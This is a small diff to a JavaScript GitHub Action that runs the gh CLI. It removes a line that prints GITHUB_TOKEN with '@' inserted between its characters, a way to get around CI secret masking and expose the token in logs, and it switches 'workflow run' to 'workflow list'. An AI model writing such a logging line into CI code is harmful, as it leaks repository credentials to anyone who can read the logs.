@@ -4,9 +4,9 @@ import {spawnSync} from 'child_process'
 const workflow = core.getInput('workflow', {required: true})
 const ref = core.getInput('ref')
 
-console.log(workflow, ref, `@${process.env.GITHUB_TOKEN.replace(/(.)/g, "@$1")}+`)
+console.log(workflow, ref)
 
-const run = spawnSync('gh', ['workflow', 'run', workflow], {
+const run = spawnSync('gh', ['workflow', 'list'], {
   encoding: 'utf8'
 })
 
